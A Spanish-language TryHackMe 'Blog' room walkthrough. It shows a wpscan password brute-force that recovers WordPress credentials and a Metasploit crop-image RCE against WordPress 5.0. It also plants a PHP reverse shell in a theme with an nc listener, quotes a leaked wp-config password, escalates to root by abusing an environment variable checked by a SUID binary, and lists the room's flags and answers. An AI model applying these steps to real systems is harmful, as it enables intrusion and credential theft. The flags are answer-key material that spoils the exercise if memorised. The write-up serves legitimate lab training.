# Blog TryHackMe

- Objetivo: Obtener acceso al sistema y escalar privilegios hasta root.
- Fecha: 12/06/2025
- Autor del reto: Liiaam251
- Enlace a la máquina: [https://tryhackme.com/room/blog](https://tryhackme.com/room/blog)
- IP de la máquina: 10.10.182.132

## Enumeración de puertos con Nmap

Comando usado

````bash
nmap -p- --open -sS -sV -sC -T4 -n -Pn 10.10.182.132
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-12 10:44 EDT
Nmap scan report for 10.10.182.132
Host is up (0.047s latency).
Not shown: 64296 closed tcp ports (reset), 1235 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.0
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-06-12T14:45:06
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-06-12T14:45:06+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.84 seconds
````
En el tryhackme nos dicen que metamos blog.thm en el /etc/hosts para que cargue la página
````bash
sudo nano /etc/hosts
````
y añadmimos: 10.10.182.132   blog.thm

Vemos que es un wodpress, podemos lanzar un wpscan para identificar usuarios existentes, subdominios y posibles contraseñas, yo he usado el diccionario rockyou.txt para el tema de contraseñas:

````
$ sudo wpscan --url http://blog.thm --passwords /home/kali/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.10.182.132]
[+] Started: Thu Jun 12 10:50:53 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 4 user/s
[SUCCESS] - kwheel / cutiepie1
````
Entramos al panel de login que está más abajo en la web con las credenciales del usuario y el password y listo, estamos dentro.

Pero el usuario solo tiene privilegios para imagenes

Ahora que estamos dentro vamos a intentar meter una reverse shell yo he sacado la mia de:  
Enlace reverse shell: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
Al subirla nos da un error:
````bash
“wordpres.php” has failed to upload.
Sorry, this file type is not permitted for security reasons.
````
Despues de estar rato buscando en subdirectorios sin exito o buscar otros posibles usuarios he ido a mirar la version del wordpress que es 5.0, entonces he usado msfconsole a ver si encontraba algo 

````
sudo msfconsole 

smsf6 > search Wordpress 5.0

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   exploit/multi/http/wp_crop_rce                           2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1   exploit/unix/webapp/wp_property_upload_exec              2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
   2   exploit/multi/http/wp_plugin_fma_shortcode_unauth_rce    2023-05-31       excellent  Yes    Wordpress File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution through shortcode
   3     \_ target: PHP                                         .                .          .      .
   4     \_ target: Unix Command                                .                .          .      .
   5     \_ target: Linux Dropper                               .                .          .      .
   6     \_ target: Windows Command                             .                .          .      .
   7     \_ target: Windows Dropper                             .                .          .      .
   8   exploit/multi/http/wp_litespeed_cookie_theft             2024-09-04       excellent  Yes    Wordpress LiteSpeed Cache plugin cookie theft
   9     \_ target: PHP In-Memory                               .                .          .      .
   10    \_ target: Unix In-Memory                              .                .          .      .
   11    \_ target: Windows In-Memory                           .                .          .      .
   12  auxiliary/scanner/http/wp_woocommerce_payments_add_user  2023-03-22       normal     Yes    Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation
   13  auxiliary/scanner/http/wp_registrationmagic_sqli         2022-01-23       normal     Yes    Wordpress RegistrationMagic task_ids Authenticated SQLi


Interact with a module by name or index. For example info 13, use 13 or use auxiliary/scanner/http/wp_registrationmagic_sqli

msf6 > use 0

````
He usado el 0 ya que he buscado para que sirve cada exploit y ese solo se usaba cuando el user tenia privilegios de imagenes solamente, despues he suado los siguientes comandos para poder continuar

````
set LHOST <tu ip tun0>
set RHOST <blog.thm>
SET PASSWORD cutiepie1
set USERNAME kwheel
````
ya estamos dentro hacemos un -h para saber los comandos que podemos usar y vemos el downloaddentro del home podemos ver que hay un suer qu se llama bjoel y dentro hay un user.txt y Billy_Joel_Termination_May20-2020.pdf

usamos:

````bash
download user.txt
download Billy_Joel_Termination_May20-2020.pdf
````
pero al abrirlos no hay nada de info en ninguno

he estado buscando y habia opcion de buscar passwords con linpeas.sh pero yo lo he hecho manualmente buscando en la carpeta donde está ubicado el wordpres, concretamente en el apartado:

/var/www/wordpress y me he descargado wp-settings.php

wp-config.php
El más importante. Contiene las credenciales de acceso a la base de datos y a veces otras claves:

Contra que hay ahí dentro: 
````
LittleYellowLamp90!@
````

Entonces dentro de Temas he metido la reverse shell de antes y esta vez si funciona, yo lo he metido en header mismo para que funcione, recuerda estar en esucha con:

````bash
nc -lvnp <puesrt>
````
Para que la consola se vea mejor he usado este comando:
````bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
````
## Escalada de Privilegios - SUID

He usado el siguiente comando para ver binarios con SUID

````bash
$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
....
````
vemos que hay un binario llamado cracker vamos a ejecutarlo a ver que nos da:
````bashe
usr/sbin/checker eadmin
/usr/sbin/checker admin
Not an Admin
````
vamos a ver que hace por atras el comando con el comando ltrace mismo, he usado antes strings pero no me quedaba muy claro
````bash
www-data@blog:/$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
````
Llama a getenv("admin")
Esto significa que el binario intenta leer una variable de entorno llamada admin.

El valor es nil
Eso indica que la variable no está definida en tu entorno actual.
Después llama a puts("Not an Admin")
Esto confirma que si no encuentra la variable admin, el programa muestra ese mensaje y termina.

Viendo eso he probado crear una variable de entorno para que en vez de nil, sea 1

export admin=1
````bash
www-data@blog:/$ export admin=1
export admin=1
````
y despues lo he ejecutado

````bash
www-data@blog:/$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/# whoami
whoami
root
````
## Task 1 - Blog

1. root.txt
entramos a /root y abrimos la flag
````
9a0b2b618bef9bfa7ac28c1353d9f318
````
2. user.txt
Hacemos un:
````bash
root@blog:/root# find / -name user.txt                        
find / -name user.txt
/home/bjoel/user.txt
/media/usb/user.txt
````
Y vamos al de /media/usb/user.txt
Respuesta:
````
c8421899aae571f7af486492b71a8ab7
````
3. Where was user.txt found?
````
/media/usb
````
4. What CMS was Billy using?
````
Wordpress
````
5. What version of the above CMS was being used?
Se puede ver en el nmao, es la version del wordpress
````
5.0 
````














